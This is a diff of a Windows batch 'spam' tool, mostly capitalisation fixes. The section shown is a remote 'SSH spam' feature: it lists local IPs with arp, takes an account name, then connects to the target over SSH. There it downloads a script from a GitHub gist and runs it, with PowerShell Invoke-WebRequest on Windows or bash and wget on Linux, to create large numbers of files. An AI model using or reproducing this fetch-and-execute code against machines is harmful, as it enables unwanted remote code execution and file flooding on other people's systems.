@@ -1626,15 +1626,15 @@
 :ssh.spam
     if "%logging%"=="1" ( call :log Opened_SSH_Spam )
     :: Not working - TLI For ssh.spam
-    echo In Order to work the Remote Spam Method needs 4 Things.
+    echo In order to work, the Remote Spam Method needs 4 things.
     @ping -n 1 localhost > nul
-    echo 1: The IP of the Device you want to spam
+    echo 1: The IP of the device you want to spam
     @ping -n 1 localhost > nul
-    echo 2: An Accountname
+    echo 2: An account name
     @ping -n 1 localhost > nul
-    echo 3: The Password of the Account
+    echo 3: The password of the account
     @ping -n 1 localhost > nul
-    echo 4: How many Files you want to create
+    echo 4: How many files you want to create
     @ping -n 1 localhost > nul
     echo.
     echo. 
@@ -1642,7 +1642,7 @@
     echo.
     echo [2] Back
     echo.
-    choice /C 12 /M "Choose an Option from Above:"
+    choice /C 12 /M "Choose an option from above:"
         set _erl=%errorlevel%
         if %_erl%==1 goto ssh.spam.info
         if %_erl%==2 goto start.verified
@@ -1650,13 +1650,13 @@
 
 :ssh.spam.info
     if "%logging%"=="1" ( call :log Listing_Local_IPs )
-    :: Ask the User to enter the IP - supported with arp
-    echo Please specify the IP of the Device
+    :: Ask the user to enter the IP - supported with arp
+    echo Please specify the IP of the device
     @ping -n 1 localhost > nul
-    echo Down Below are a Few IPs in your Network. 
+    echo Down below are a few IPs in your network. 
     arp -a 
     @ping -n 1 localhost > nul
-    echo If you need help finding the IP type "help"
+    echo If you need help finding the IP, type "help"
     @ping -n 1 localhost > nul
     echo.
     @ping -n 1 localhost > nul
@@ -1669,22 +1669,22 @@
     )
 
 :ssh.spam.setup
-    :: Enter other things needed for Remotespam
-    set /P ssh-name=Enter an Account Name:
-    rem set /P ssh-pswd=Enter the Password of the Account:
+    :: Enter other things needed for Remote spam
+    set /P ssh-name=Enter an account name:
+    rem set /P ssh-pswd=Enter the password of the account:
     set /P ssh-filecount=How many files do you want to create:
     call :sys.verify.execution
     cls
 
 :ssh.start.spam
-    echo Is the SSH Target based on Linux or Windows?
+    echo Is the SSH target based on Linux or Windows?
     echo.
     echo [1] Windows
     echo.
     echo [2] Linux
     echo.
     echo.
-    choice /C 12 /M "Choose an Option from Above:"
+    choice /C 12 /M "Choose an option from above:"
         set _erl=%errorlevel%
         if %_erl%==1 goto spam.ssh.target.win
         if %_erl%==2 goto spam.ssh.target.lx
@@ -1692,24 +1692,23 @@
 
 :spam.ssh.target.win
     if "%logging%"=="1" ( call :log Spamming_Windows_SSH_Target )
-    set ssh_command=Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%
+    set ssh_command=Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/4ee726c3d20d9f028b7e15a057c85163/raw/825fbd4af7339fab4f7bd62dd75f2cf9a239412b/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%
     ssh %ssh-name%@%ssh-ip% powershell -Command "%ssh_command%"
     color 02
-    echo Successfully executed SSH Connection.
+    echo Successfully executed SSH connection.
     goto ssh.done
 
 :spam.ssh.target.lx
     if "%logging%"=="1" ( call :log Spamming_Linux_SSH_Target )
-    set ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%
+    set ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %ssh-filecount%
     ssh %ssh-name%@%ssh-ip% %ssh_command%
     color 02
-    echo Successfully executed SSH Connection.
+    echo Successfully executed SSH connection.
     goto ssh.done
-
 
 :ssh.done
     if %logging% == 1 ( call :log Finished_SSH_Spam_Files:_%ssh-filecount%_Host_%ssh-name% )
-    call :done "The Script Created %ssh-filecount% Files on the Machine of %ssh-name%"
+    call :done "The script created %ssh-filecount% files on the machine of %ssh-name%"
 
 :desktop.icon.spam
     if %logging% == 1 ( call :log Opened_Desktop_Spam )
